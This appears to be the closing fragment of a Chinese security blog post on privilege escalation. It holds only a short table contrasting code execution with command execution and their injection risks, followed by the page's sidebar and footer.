<td><strong>原生支持命令执行；需注意变量拼接安全（如</strong><code>$var</code>需引号包裹）</td>
<td></td>
</tr>
</tbody></table>
<h3 id="核心区别与安全建议"><a href="#核心区别与安全建议" class="headerlink" title="核心区别与安全建议"></a>核心区别与安全建议</h3><table>
<thead>
<tr>
<th><strong>维度</strong></th>
<th><strong>代码执行</strong></th>
<th><strong>命令执行</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>执行内容</strong></td>
<td><strong>当前语言的代码片段</strong></td>
<td><strong>操作系统命令 &#x2F; 外部程序</strong></td>
</tr>
<tr>
<td><strong>依赖环境</strong></td>
<td><strong>语言运行时</strong></td>
<td><strong>操作系统环境（shell、可执行文件）</strong></td>
</tr>
<tr>
<td><strong>安全风险</strong></td>
<td><strong>代码注入（执行恶意代码）</strong></td>
<td><strong>命令注入（执行恶意系统命令）</strong></td>
</tr>
</tbody></table>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lmlsama.github.io/2025/12/26/%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2/" data-id="cuidswFGExEYAp4mmfIbDZIA2" data-title="提权精讲" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/12/">December 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/12/27/test1/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/12/27/%E9%9D%B6%E6%9C%BA%E7%B2%BE%E8%AE%B2%EF%BC%9ACONNECT-THE-DOTS/">靶机精讲：CONNECT THE DOTS</a>
          </li>
        
          <li>
            <a href="/2025/12/26/%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2/">提权精讲</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>